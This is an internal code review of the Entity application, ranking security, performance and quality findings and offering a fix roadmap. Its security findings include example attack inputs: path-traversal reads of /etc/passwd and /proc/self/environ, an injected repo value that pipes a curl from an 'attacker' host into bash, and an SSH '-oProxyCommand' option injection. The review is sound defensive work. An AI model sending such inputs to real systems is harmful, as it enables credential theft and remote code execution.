# Entity 10x Review — 2026-07-01

Principal-engineer review of the Entity codebase at repo root. Goal: a ranked,
evidence-backed roadmap to make Entity **10x faster, 10x higher quality, and materially
more secure** without breaking the working product.

- **Method:** Phase 0 baseline measured on this VM, then three parallel lenses (perf,
  quality, security) reading the real code. Every finding cites `file:line`. Security
  findings trace untrusted-input → sink and are split into *verified-exploitable* vs
  *hardening*.
- **No code was changed.** This is a review artifact. Each roadmap item becomes its own
  change with its own tests, gated by `npm run ctrl:gate` and the Prove-It pattern
  (failing test first for every bug-class finding).
- **Environment note:** all timings taken in the Cursor Cloud VM against a tiny local DB
  (`/api/tasks` returns 8 KB). API latency numbers are floors; the scaling behavior
  described in perf findings is what bites in production, so those findings also give the
  measurement plan to confirm at scale.

## 2. Findings

Priority key: **P0** = exploitable security, or user-facing latency on the critical path.
**P1** = significant but not critical-path-fatal. **P2** = worthwhile hardening/cleanup.
Effort: **S** (localized), **M** (multi-file), **L** (subsystem).

### Security

#### `[P0] [security] Legacy /api/file, /api/file/raw, /api/files allow arbitrary local file read + directory listing`
- **Evidence:** `packages/server/src/index.ts:1476-1490` (`/api/file` reads `req.query.path` straight into `fs.promises.readFile`), `index.ts:1358-1366` (`readRawLocalFile` — no workspace root check), `index.ts:1426-1447` (`/api/files` lists any `dirPath = rawPath || WORKSPACE`), `index.ts:1449-1474` (`/api/file/raw`). Contrast with mutating routes that go through `resolveWorkspaceMutationPath()` at `index.ts:927-945`.
- **Attacker / flow:** any client reaching the API → `GET /api/file?path=/etc/passwd`, `GET /api/file/raw?path=/proc/self/environ`, `GET /api/files?path=/`. Read paths were never migrated to the workspace-bound resolver that mutating paths use.
- **Impact:** read any file the Node process can (`.env`, SSH keys, the SQLite DB, cloud metadata), plus directory enumeration. Gated only by the API auth boundary, which is open by default (next finding).
- **Fix:** route the three legacy read handlers through the same `resolveWorkspaceMutationPath`-style containment (or delete them in favor of `/api/fs/*`, which already normalizes within a source root).
- **Verify:** add a failing test asserting `GET /api/file?path=/etc/passwd` → 400/403; confirm workspace-relative reads still pass.
- **Effort:** M

#### `[P0] [security] API auth fails open when ENTITY_API_TOKEN is unset`
- **Evidence:** `packages/server/src/middleware/api-auth.ts:172-178` — `if (!tokenHash) return next();` (no check). Applied globally at `index.ts:185` before all routes.
- **Attacker / flow:** any network client when the server binds a routable interface (LAN, Cloud VM, misconfigured prod, tunnel). No token → unauthenticated access to terminal creation, legacy file read (above), swarm dispatch, task/agent APIs, plugin settings, FS source registration (below).
- **Impact:** this is the master key that makes every other API-reachable sink exploitable. Documented as "dev mode," but it is silent — nothing warns when the server is exposed without a token.
- **Fix:** fail closed when binding a non-loopback interface without a token; log a loud warning; keep pass-through only for explicit localhost/dev profile.
- **Verify:** boot with a non-loopback bind and no token → startup refuses or all `/api/*` return 401; loopback dev still open.
- **Effort:** M

#### `[P0] [security] Arbitrary filesystem roots can be registered as sources → read/write anywhere the process can`
- **Evidence:** `packages/server/src/fs/routes-sources.ts:184-195` (`base_path` stored with no allowlist), `fs/adapters/local.ts:47-64` (`path.resolve(basePath)` becomes the root), `fs/adapters/local.ts:66-74` (adapter hardcodes `write: true`, ignoring DB `capabilities`), `fs/routes-files.ts:176-214` (`POST /api/fs/file` writes through the adapter).
- **Attacker / flow:** API client → `POST /api/sources {type:"local", basePath:"/etc"}` (or `/`), then read/write within that root via `/api/fs/*`. The multisource design guards traversal *inside* a source but never constrains *which roots* can be registered.
- **Impact:** read `/etc/shadow` (perms permitting), write cron/webshell payloads under an attacker-chosen root, exfiltrate home + repo. High-severity write primitive.
- **Fix:** allowlist `base_path` (e.g. must resolve under `WORKSPACE`); honor the DB `capabilities` record instead of hardcoding `write:true`.
- **Verify:** failing test that registering `basePath:"/etc"` is rejected; write outside workspace denied.
- **Effort:** M

#### `[P0] [security] geordi-swarm SSH dispatch builds a remote shell command by string interpolation (command injection)`
- **Evidence:** `packages/server/src/plugins/geordi-swarm/routes.ts:224-231`:
  ```ts
  const repoPath = job.repo.replace('~', macHome || '/Users');
  const safePrompt = prompt.replace(/'/g, "'\\''");
  const child = spawn('ssh', [macHost,
    `cd ${repoPath} && ${codexBin} exec --approval-mode full-auto --quiet '${safePrompt}'`], ...);
  ```
  `repoPath` and `codexBin` are interpolated into the remote command string **unescaped** (only `prompt` is single-quote escaped). `job.repo` originates from request body at `routes.ts:388-405`.
- **Attacker / flow:** API client creates/dispatches an SSH-provider swarm job with `repo: "/tmp; curl attacker|bash #"` (or patches `sshCodexBin`); the string is injected into the remote shell on the SSH target.
- **Impact:** RCE on the SSH target (typically operator's Mac). Live when the plugin fallback path runs (core mount fails).
- **Fix:** pass a fixed remote script via `execFile('ssh', [host, '--', scriptPath])`, or strictly validate/escape `repoPath` and `codexBin`; drop `--approval-mode full-auto` for untrusted job authors.
- **Verify:** failing test that a job with shell metacharacters in `repo` does not alter the argv/remote string.
- **Effort:** M

#### `[P1] [security] Terminal PTY input is not bound to the creating socket`
- **Evidence:** `packages/server/src/terminal.ts:207-214` spawns `/bin/zsh -f` with `cwd=WORKSPACE` and full inherited `process.env`; `terminal.ts:439-448` — any WS client that knows a `sessionId` can `session.process.write(data)`; ownership only affects close-on-disconnect (`terminal.ts:495-496`). WS auth is only at HTTP upgrade (`index.ts:333-341`).
- **Attacker / flow:** authenticated (or, with token unset, unauthenticated) WS client subscribes with a known/guessed `sessionId` and writes to another user's shell.
- **Impact:** full OS shell as the server UID within the workspace. Session UUID entropy is the only barrier between subscribers.
- **Fix:** bind `terminal:input` to the creating socket (or a per-session secret).
- **Verify:** test that a second socket writing to a session it didn't create is rejected.
- **Effort:** S–M

#### `[P1] [security] acpx dispatch runs with --approve-all in an attacker-controlled cwd`
- **Evidence:** `packages/server/src/plugins/geordi-swarm/routes.ts:127-148` — `spawn(ACPX_BIN, ['--cwd', localRepo, '--approve-all', ..., 'codex', 'exec', '-f', promptFile])`; `localRepo` from `job.repo`; prompt file holds `job.title/spec/feedback`.
- **Impact:** autonomous auto-approved agent execution in an attacker-chosen directory; code execution on the gateway host, bounded only by the Codex/acpx sandbox.
- **Fix:** validate `job.repo` against an allowlist; remove `--approve-all` for untrusted job authors.
- **Verify:** dispatch with an out-of-allowlist repo is rejected.
- **Effort:** M

#### `[P1] [security] entity-services SSH target allows option injection`
- **Evidence:** `packages/server/src/plugins/entity-services/routes.ts:849-860` reads `macDiscoverySshTarget` from plugin settings; `routes.ts:794-795` calls `execFileAsync('ssh', ['-o','ConnectTimeout=10', config.sshTarget, command])`. OpenSSH treats an argv token beginning with `-` before the hostname as an option, so `sshTarget = "-oProxyCommand=..."` runs an arbitrary local command.
- **Impact:** RCE as the server user during service-discovery refresh.
- **Fix:** reject targets starting with `-`; use `ssh -o BatchMode=yes -- <host>` with hostname validation.
- **Verify:** setting a `-o...` target is rejected before spawn.
- **Effort:** S

#### `[P1] [security] Swarm workflow state transitions have no integrity control beyond the global bearer`
- **Evidence:** `packages/server/src/swarm/routes.ts:272-305,367-416` — `complete`, `claim`, `proof`, `PATCH status:"done"` have no service secret / role check.
- **Impact:** mark jobs done without proof, hijack claims, pollute the audit trail (integrity/confusion; escalates when combined with dispatch).
- **Fix:** require a service token or role for tracker mutations.
- **Verify:** unauthenticated `complete` rejected.
- **Effort:** M

#### `[P2] [security] OpenClaw review webhook auth is optional`
- **Evidence:** `packages/server/src/editor/reviews.ts:50-62` — auth enforced only if `ENTITY_OPENCLAW_WEBHOOK_TOKEN` is set; otherwise the body is trusted.
- **Impact:** forged review results / document-review state manipulation when the token is unset.
- **Fix:** require the token in any non-local profile.
- **Effort:** S

#### `[P2] [security] /api/test-error schedules an uncaught throw`
- **Evidence:** `packages/server/src/index.ts:6224-6237` — `setTimeout(() => { throw new Error(...) }, 100)` outside the request handler; combined with `uncaughtException` → shutdown (`index.ts:6312-6314`).
- **Impact:** repeated probing can crash/restart-loop the process where supervision is weak.
- **Fix:** gate behind `NODE_ENV !== 'production'`.
- **Effort:** S

#### `[P2] [security] Known-vulnerable deps on the server request path`
- **Evidence:** `packages/server/package.json:25-26` (`ws ^8.19.0` — advisory range 8.0–8.20.1 memory-exhaustion DoS), Express's `path-to-regexp <0.1.13` ReDoS (high), `shell-quote` critical at root lockfile (server uses its own `shellQuote` in `terminal.ts:150-152`, so lower real exposure).
- **Fix:** bump `ws` to 8.20.2+, update Express/path-to-regexp, per repo policy prefer pinning + `minimum-release-age`.
- **Verify:** `npm audit --workspace=@entity/server` clean on those advisories; `npx vitest run` still green.
- **Effort:** S

#### Security hardening bucket (theoretical / defense-in-depth)
- **WS/onboarding tokens in URLs** (`middleware/api-auth.ts:245-254`, `config/routes.ts:594-687`) — log/referrer leakage; move to headers.
- **Client-spoofable permission headers**, default role `manager` when `x-entity-role` absent (`request-permissions.ts:29-44`) — fine for local dev, not an authz boundary.
- **No rate limiting anywhere** — amplifies token guessing, lead spam, search/qmd load.
- **Broad CSP `connect-src 'self' http: https: ws: wss:`** (`security.ts:7`) — weak exfil constraint.
- **HTTP-markdown SSRF** (`fs/adapters/http-markdown.ts:74-80`): `assertAllowedRemoteUrl` only restricts when `ENTITY_FS_ALLOWED_HOSTS` is set; empty allowlist = no restriction (`fs/security.ts:49-55`).
- **SetupClaw lead endpoint** (`index.ts:268-320`) stores JSONL, PII/spam risk if unauthenticated.

### Performance

#### `[P0] [perf] Monolithic production bundle — zero code splitting`
- **Evidence:** `packages/app/vite.config.ts` has no `build.rollupOptions`/`manualChunks`; `packages/app/src/main.tsx:4` statically imports `./App`; no `React.lazy` or dynamic `import(` anywhere in `packages/app/src`.
- **Measured impact:** one `index-*.js` at **2,454 kB / 705 kB gzip** (baseline). On mobile CPUs, parse+compile of 700 KB gzip JS often exceeds download time — this is the largest single slice of first paint.
- **Fix:** `manualChunks` for `codemirror`, `@tiptap/*`, `@xterm/*`, `react-markdown`, `@sentry/react`; `React.lazy` for tab surfaces (Chat, Agents, Editor, Mission Control).
- **Verify:** build emits multiple chunks; loading `/` without visiting Chat/Files shows those libs absent from the network waterfall; re-measure gzip total.
- **Effort:** M

#### `[P0] [perf] App root statically imports every heavy editor/terminal surface`
- **Evidence:** `packages/app/src/App.tsx:2-45` top-level imports `MarkdownPreview`, `CodeMirrorEditor`, `CodeMirrorFileViewer`, `BottomTerminalPanel`, `ChatView`, `AgentDashboardV2`, `TaskBoard`; tabs are conditional at render time (`App.tsx:5527-5551`) but imports are unconditional. Heavy libs pulled in: CodeMirror (`CodeMirrorEditor.tsx:2-9`), xterm (`BottomTerminalPanel.tsx:2-4`), react-markdown/rehype-highlight (`MarkdownPreview.tsx:1-8`).
- **Measured impact:** this is *why* 1847 modules collapse into one chunk.
- **Fix:** move each tab behind a lazy boundary; keep only the shell (nav + task list) in the entry chunk.
- **Verify:** chunk graph shows editor/terminal/markdown split out.
- **Effort:** M

#### `[P1] [perf] Task board fetches the full task list unbounded, plus a 30 s fallback poll`
- **Evidence:** client `packages/app/src/hooks/useTaskBoard.ts:688-692` requests `/tasks` with no `limit`/`offset`; poll at `useTaskBoard.ts:1073-1079` (30 s) duplicates the `task:updated` WS handler at `1086-1111`. Server default `packages/server/src/task-pagination.ts:16-17` — `DEFAULT_LIMIT = null`; `74-77` returns **all** tasks when limit is null. DB `packages/db/src/index.ts:8091-8157` — `SELECT * FROM tasks ORDER BY updated_at DESC` + per-list project attach.
- **Measured impact:** 8 KB / 10.5 ms today; scales O(n tasks × row width) across SQLite + JSON + gzip + React reconciliation. Becomes the dominant background cost at hundreds/thousands of tasks.
- **Fix:** default a server `limit` (e.g. 200) with column filter pushed to SQL; drop the poll while WS is connected.
- **Verify:** payload size stays flat as task count grows (seed 10k tasks and re-measure).
- **Effort:** S–M

#### `[P1] [perf] GET /tasks/:id loads the entire task table to resolve subtasks`
- **Evidence:** `packages/server/src/index.ts:2338-2358` — after `getTask(id)` it calls `taskSyncLayer.listTasks()` and filters in memory.
- **Measured impact:** a single-task detail open pays full-table-scan cost; negligible today, severe at scale (detail panel is a hot path).
- **Fix:** indexed `listSubtasks(parentId)` query.
- **Verify:** `/api/tasks/:id` latency flat with 10k tasks.
- **Effort:** S

#### `[P1] [perf] Agent @mention and chat replies are fully blocking (no streaming), and @mentions run serially`
- **Evidence:** `packages/server/src/agent/index.ts:1,159` uses `generateText` (not `streamText`); `agent/comment-responder.ts:265-275` loops `for (const agent of agents) { await generateText(...) }`; chat path `routes/chat.ts:1240-1260` awaits all agent replies before `res.status(201)`, with `AGENT_REPLY_TIMEOUT_MS = 60_000` (`chat.ts:55`). No Anthropic cache-control anywhere.
- **Measured impact:** user waits full model latency (2–15 s+) before any text appears; multi-mention latency *sums*.
- **Fix:** stream tokens to the UI over WS; `Promise.all` independent mentions; use a cheap model/template for move/pickup intents (heuristic already exists at `comment-responder.ts:37-50`); add prompt caching.
- **Verify:** reply TTFB < 500 ms; multi-agent completes in ~max(individual), not sum.
- **Effort:** M–L

#### `[P1] [perf] 3–5 redundant WebSocket connections per session`
- **Evidence:** distinct client sockets in `useWebSocket.ts:83`, `useEntityWebSocket.ts:56`, `TaskDetailPanel.tsx:2169`, `BottomTerminalPanel.tsx:324`, and `useWebSocket.ts:182` (`useAgentTyping`). Server fan-out is single (`index.ts:368-387`).
- **Measured impact:** 3–5× handshake/heartbeat overhead and duplicated JSON parse per broadcast (esp. full `task:updated` objects).
- **Fix:** one shared WS multiplexer via context/provider.
- **Verify:** DevTools shows 1 WS; one parse per broadcast.
- **Effort:** M

#### `[P1] [perf] Duplicate FileIndexRunner starts on boot (double disk I/O)`
- **Evidence:** `packages/server/src/fs/index.ts:102-132` constructs a runner and calls `runIndexer()` immediately + interval; `index.ts:6334-6354` constructs a **second** `FileIndexRunner` in the `listen` callback with its own immediate run + 15-min interval.
- **Measured impact:** doubles startup disk I/O and background CPU; contributes to the 4.6 s cold-start tail.
- **Fix:** single registration path.
- **Verify:** one "starting index run" log line; one timer.
- **Effort:** S

#### `[P1] [perf] /api/agents/focus walks agent workspaces on every request; client polls every 15 s`
- **Evidence:** server `index.ts:6070-6149` does BFS `readdir`/`stat` per agent workspace (`maxDepth: 3`); client `App.tsx:2423-2441` polls every 15 s.
- **Measured impact:** continuous sync FS walks under load (invisible on the empty VM workspace, costly on real ones).
- **Fix:** cache server-side (reuse file-index DB / mtime), push via WS, or gate on tab visibility.
- **Verify:** p99 flat under load; no repeated full-tree walks.
- **Effort:** M

#### `[P1] [perf] App.tsx is a ~6.6k-line god component amplifying re-renders`
- **Evidence:** `packages/app/src/App.tsx` (~6.6k lines); `useWebSocket.ts:94-95` calls `setLastMessage` on every WS message though App only reads `connected`; `useActivityStream.ts:367-370` sets `loading` on every 3 s poll; `useTaskBoard.ts:147-156` replaces the whole `tasks` array reference on any upsert.
- **Measured impact:** kanban/agents reconcile on 3 s activity poll + file WS + task WS even when idle.
- **Fix:** split App into route containers; stop updating unused `lastMessage`; skip `setLoading` on background refresh; narrow Zustand selectors with `shallow`.
- **Verify:** React Profiler — idle session shows near-zero App commits.
- **Effort:** L

#### `[P1] [perf] Kanban cards unmemoized — full column re-render on any task mutation`
- **Evidence:** `packages/app/src/components/mission-control/MCTaskCard.tsx:43` exports without `React.memo`; `KanbanColumn.tsx:157-172` maps all `visibleTasks`; no `React.memo` in `mission-control/`.
- **Measured impact:** one `task:updated` re-renders all visible cards in all columns.
- **Fix:** `memo(MCTaskCard)` with stable callbacks; virtualize long columns.

- **Effort:** S

#### `[P2] [perf] Activity feed (3 s) and FileTree (5 s) polls duplicate existing WS events`
- **Evidence:** `useActivityStream.ts:7,396-398` polls every 3 s though the server already broadcasts `activity:created` (`index.ts:1105`); `FileTree.tsx:5,98-102,167` polls every 5 s though App handles `file:*` WS events (`App.tsx:2184-2210`).

#### `[P2] [perf] WS file:changed broadcasts entire file contents to every client`

#### `[P2] [perf] App build runs full tsc serially before Vite; ctrl:gate builds serially`
- **Evidence:** `packages/app/package.json` `"build": "tsc && vite build"` (tsc is typecheck-only, `tsconfig.json` `noEmit: true`); root build runs app→db→server serially.
- **Measured impact:** ~8 s of the 13.6 s app build is tsc; ctrl:gate is 19.5 s serial.

- **Verify:** ctrl:gate wall time trends toward max(package), not sum.

### Quality

#### `[P0] [quality] Commit gate runs builds but zero tests ("MVP mode")`
- **Evidence:** `scripts/ctrl-gate-runner.sh` prints "MVP mode — build passed, tests optional" and runs `npm run test:unit` non-fatally; `package.json` `"test:unit": "echo \"No unit tests configured\""`; `.ctrlrc.json` `"mode":"mvp"`, `"required":["build"]`. Confirmed live: ctrl:gate passed while running only the echo.
- **Impact:** 573 passing server tests never gate commits/CI by default; regressions ship on a green build alone.
- **Fix:** `"test:unit": "npm run test --workspaces --if-present"`; add `"test"` scripts where missing; flip `.ctrlrc.json` to enforce when ready.
- **Verify:** ctrl:gate exits non-zero when a server test fails.
- **Effort:** S

#### `[P0] [quality] packages/server/src/index.ts is a 6,378-line monolith`
- **Evidence:** `index.ts` is 6,378 lines; owns inline task routes (`index.ts:2366+`), a separate documents DB + schema (`index.ts:654-672`), direct `.prepare(...)` SQL (`index.ts:4427+`), WS bootstrap, plugin wiring. ~12× the AGENTS.md ~500 LOC guidance.
- **Impact:** highest blast-radius file in the repo; every change risks tasks, files, agents, documents, and WS together.
- **Fix:** extract `routes/tasks.ts`, `routes/legacy-files.ts`, a `documents/` module; leave `index.ts` as wiring.
- **Verify:** `npm run build && npx vitest run`; smoke the moved endpoints.
- **Effort:** L

#### `[P1] [quality] Async Express handlers without try/catch — Express 4 does not catch rejections`
- **Evidence:** no `asyncHandler`/`wrapAsync` anywhere in `packages/server/src`; e.g. `routes/task-review-gates.ts:97-104` and `routes/agent-registry.ts:205-209` are async with no try. Global `unhandledRejection` at `index.ts:6308-6310` only `console.error`s (no `Sentry.captureException`).
- **Impact:** a rejected await → hung request + process-level unhandled rejection; observability gap.
- **Fix:** add an `asyncHandler(fn)` wrapper; report to Sentry in the rejection handler.
- **Verify:** test that mocks a route dependency to reject → 500 JSON, not an unhandled rejection.
- **Effort:** M

#### `[P1] [quality] Highest-risk server subsystems are thinly covered despite 573 tests`
- **Evidence (colocated test map):** `agent/` has 24 source files, 11 tests (no tests for `scheduler.ts`, `config.ts`, `log.ts`, `helm-light-controls.ts`); `swarm/` has 20 source files, 4 tests (none for `dispatcher.ts`); `fs/routes-sources.ts` (384 LOC) untested; `plugins/geordi-swarm/routes.ts` (687 LOC) untested. Five highest-risk untested modules: (1) `index.ts` inline routes, (2) `editor/service.ts` (1713 LOC), (3) `swarm/dispatcher.ts`, (4) `fs/routes-sources.ts`, (5) `agent/helm-light-controls.ts`.
- **Impact:** agent scheduling, swarm dispatch, FS source admin, Helm controls can regress silently.
- **Fix:** focused tests for dispatcher, `routes-sources` CRUD/validation, `helm-light-controls` policy matrix; extract+test the top task routes.
- **Verify:** new tests appear in `vitest run`.
- **Effort:** L

#### `[P1] [quality] packages/db has zero tests and the server bypasses it with raw SQLite`

## 3. Top 10 roadmap (sequenced to avoid conflicts)

Ordered so security fail-closed lands before the surfaces it protects are refactored, and
so bundle work precedes React re-render work (splitting changes the render graph).

1. **Make the gate real** *(quality P0, S)* — wire `test:unit` to the workspace fan-out so
   the 573 server tests gate commits. *Prereq for every later item* — nothing else is safe
   to land without an enforced gate. Cumulative effect: ctrl:gate goes from 0 → 573 tests
   run; adds ~6.5 s to the 19.5 s gate.
2. **Fail closed on auth** *(security P0, M)* — refuse non-loopback bind without
   `ENTITY_API_TOKEN`; loud warning otherwise. Closes the master-key precondition for
   findings on file read, FS roots, terminal, swarm.
3. **Contain legacy file read** *(security P0, M)* — route `/api/file(/raw)` and `/api/files`
   through the workspace resolver (or delete). Removes arbitrary-read.
4. **Allowlist FS source roots + honor capabilities** *(security P0, M)* — constrain
   `base_path` under `WORKSPACE`; stop hardcoding `write:true`. Removes arbitrary
   read/write primitive.
5. **Fix command-injection sinks** *(security P0/P1, M)* — geordi SSH dispatch string,
   acpx `--approve-all` cwd, entity-services SSH `-o` injection; bind terminal input to the
   creating socket. Removes RCE chains.
6. **Split the bundle + lazy tabs** *(perf P0, M)* — `manualChunks` + `React.lazy` for
   Chat/Agents/Editor/Terminal. Expected: initial JS from **705 KB gzip → roughly 200–300 KB
   gzip** for the shell, remainder loaded on demand. Biggest first-paint win.
7. **Unify WebSockets + drop redundant polls** *(perf P1, M)* — one multiplexed socket;
   subscribe activity/file trees to WS instead of 3 s/5 s polls. Cuts idle req/min and
   duplicate parses; must land after #6 since lazy tabs change which sockets mount.
8. **Paginate task lists + fix `/tasks/:id` subtask scan** *(perf P1, S–M)* — default server
   limit, indexed subtask query, drop the 30 s poll when WS is live. Keeps `/api/tasks`
   payload flat as the DB grows.
9. **Stream agent/chat replies + parallelize @mentions + prompt caching** *(perf P1, M–L)* —
   `streamText` over WS, `Promise.all`, cheap model for intent parsing. Turns 2–15 s blocking
   waits into sub-second TTFB.
10. **Break up `index.ts` + add asyncHandler + tests for the 5 riskiest modules**
    *(quality P0/P1, L)* — safe only after #1 (gate) and the security containment above,
    because extraction touches the same routes. Also delete `.bak` files and de-hoist
    server deps as low-risk riders.

**Cumulative expected effect on baseline:** first paint dominated by a ~200–300 KB gzip
shell instead of 705 KB; idle background traffic cut from ~30 req/min (3 s + 5 s + 15 s
polls) to near-zero; agent reply TTFB from seconds to sub-second; the commit gate from
0 → 578+ tests; and the four verified-exploitable RCE/read/write chains closed.

## 4. Explicitly rejected findings (looked bad, were fine)

**Perf**
- **SQLite index coverage** — tasks/activities queries are indexed (`packages/db/src/index.ts:8091`, `9634-9656` with `LIMIT ?`); baseline API ms confirms healthy small-DB paths.
- **`attachProjectsToTasks` N+1** — uses a batched `IN (...)` query (`packages/db/src/index.ts:7784-7797`), not a per-task loop.
- **Compression + static caching** — `compression()` mounted at `index.ts:178`; hashed assets immutable + `index.html` no-cache in `static-cache.ts:30-43`. Correct.
- **chokidar "watching too much"** — `chokidar` is a dependency but **unused** in `packages/server/src` (verified: no imports). It's dead weight, not watcher churn.
- **RichTextEditor / TipTap / marked / mermaid in the bundle** — `RichTextEditor.tsx` is never imported; `marked`/`mermaid` have no app-src imports; tree-shaken from the prod bundle (dependency bloat, not runtime cost).
- **`/api/agents` 21 ms** — server caches gateway pings in `agentStatusCache` (`index.ts:5986-6048`); the path is cheap (client duplicate polling is the real waste).
- **Vitest 6.5 s / server tsc 4.7 s** — CI time, not user-facing latency.

**Quality**
- **"Agent loop untested"** — core loop is well covered (`agent/index.test.ts`, `tools.test.ts`, `settings.test.ts`, `comment-responder.test.ts`, `__tests__/agent-scheduler.test.ts`); gaps are peripheral files, not the loop.
- **"Plugin loading untested"** — `plugins/registry.test.ts`, `migrations.test.ts`, `hooks.test.ts`, `routes.test.ts` exist; async registration catches errors (`registry.ts:611-629`).
- **"Terminal has no error handling"** — HTTP create wraps spawn (`terminal.ts:531-541`); WS handlers try/catch parse/write/resize (`terminal.ts:401-472`); `onExit` wired. Gap is a missing *test* for the spawn-failure path, not missing handlers.
- **"No global crash handlers"** — `uncaughtException` and SIGINT/SIGTERM handled (`index.ts:6300-6314`); only `unhandledRejection` is weak (logs, no Sentry).
- **"strict mode disabled"** — all four package tsconfigs set `"strict": true`; the gap is *extra* strict flags.
- **Mobile/desktop duplicate API clients** — `mobile/App.tsx` is a WebView shell and `desktop`/`electron` only load a URL; the real duplication is intra-`packages/app`.

**Security**
- **`shell-quote` critical CVE** — the server uses its own `shellQuote` (`terminal.ts:150-152`), not the vulnerable npm API surface, so real exposure is far lower than the audit line implies (still worth patching the dep).
- **Docs viewer XSS (`routes/docs.ts:66-132`)** — `DOCS_HTML` uses `marked.parse` → `innerHTML`, but that template is dead code; the live `/docs/*` route serves the SPA (`routes/docs.ts:507-509`).
- **`new Function` in chat model registry (`chat-model-registry.ts:347-349`)** — loads a trusted local file from `plugin-runtime-deps`, not user input.
- **Search qmd via `/bin/sh -c` (`search.ts:485-504`)** — user `q`/`id` are escaped through `shEscape()` (`search.ts:142-145`); the ssh target comes from env only. Safe as written.
- **Edge TTS (`tts.ts:384,571`)** — `execFile`/`execFileSync` with an argv array, no shell — safe from metacharacter injection despite user text in args.
